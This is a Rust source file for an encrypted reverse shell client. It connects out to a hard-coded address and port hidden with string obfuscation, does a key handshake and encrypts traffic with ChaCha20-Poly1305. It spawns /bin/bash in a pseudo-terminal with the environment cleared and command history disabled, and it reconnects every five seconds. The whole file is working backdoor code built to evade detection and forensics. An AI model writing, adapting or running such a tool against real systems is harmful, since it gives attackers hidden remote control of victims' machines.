use futures::{SinkExt, StreamExt};
use portable_pty::{CommandBuilder, NativePtySystem, PtySize, PtySystem};
use std::io::{Read, Write};
use tokio::{
    net::TcpStream as TokioTcpStream,
};
use tokio_util::codec::{FramedRead, FramedWrite};

use chacha20poly1305::{ChaCha20Poly1305, KeyInit};
use obfstr::obfstr;

mod codec;
use codec::EncryptedCodec;
use revshell::do_handshake;

#[tokio::main]
async fn main() {
    loop {
        match reverse_shell().await {
            Ok(_) => println!("[*] Goodbye."),
            Err(e) => eprintln!("[!] Connection error: {}. Retrying in 5 seconds...", e),
        }

        tokio::time::sleep(std::time::Duration::from_secs(5)).await;
    }
}

fn shell_setup() -> Result<portable_pty::PtyPair, Box<dyn std::error::Error>> {
    let pty_system = NativePtySystem::default();
    // TODO: For this, we would need a custom signaling protocol - we might look at this later
    let pty_pair = pty_system
        .openpty(PtySize {
            rows: 24,
            cols: 80,
            pixel_width: 0,
            pixel_height: 0,
        })
        .map_err(|e| format!("failed to create pty: {}", e))?;

    let mut _cmd = CommandBuilder::new(obfstr!("/bin/bash"));
    _cmd.env_clear();
    _cmd.env(obfstr!("TERM"), obfstr!("xterm-256color"));
    _cmd.env(obfstr!("PS1"), obfstr!("[V] \\u@\\h:\\w\\$ "));
    _cmd.env(obfstr!("HISTFILESIZE"), "0");
    _cmd.env(obfstr!("HISTSIZE"), "0");

    let _bash = pty_pair
        .slave
        .spawn_command(_cmd)
        .map_err(|e| format!("failed to spawn: {}", e))?;
     Ok(pty_pair)
}

async fn reverse_shell() -> Result<(), Box<dyn std::error::Error>> {
    let mut stream = TokioTcpStream::connect(obfstr!("127.0.0.1:4444")).await?;
    let (key_rx, key_tx) = do_handshake(&mut stream).await?;

    let cipher_tx = ChaCha20Poly1305::new_from_slice(&key_tx).map_err(|e| format!("cipher init error: {}", e))?;
    let cipher_rx = ChaCha20Poly1305::new_from_slice(&key_rx).map_err(|e| format!("cipher init error: {}", e))?;

    let (tcp_reader, tcp_writer) = tokio::io::split(stream);
    let mut frame_reader = FramedRead::new(tcp_reader, EncryptedCodec::new(cipher_rx));
    let mut frame_writer = FramedWrite::new(tcp_writer, EncryptedCodec::new(cipher_tx));

    let pty_pair = shell_setup()?;

    let mut pty_reader = pty_pair.master.try_clone_reader()?;
    let mut pty_writer = pty_pair.master.take_writer()?;
    
    let (tx, mut rx) = tokio::sync::mpsc::channel::<Vec<u8>>(64);
    
    tokio::task::spawn_blocking(move || {
        let mut buf = [0u8; 4096];
        loop {
            match pty_reader.read(&mut buf) {
                Ok(n) if n > 0 => {
                    // Send the data to the other thread
                    let _ = tx.blocking_send(buf[..n].to_vec());
                }
                _ => break,
            }
        }
    });

    loop {
        tokio::select! {
            Some(result) = frame_reader.next() => {
                match result {
                    Ok(data) => {
                        pty_writer.write_all(&data)?;
                        pty_writer.flush()?;
                    }
                    Err(e) => {
                        return Err(format!("network error: {}", e).into());
                    }
                }
            }

            Some(data) = rx.recv() => {
                if let Err(e) = frame_writer.send(data).await {
                    return Err(format!("failed to send: {}", e).into());
                }
            }

            else => break
        }
    }

    Ok(())
}
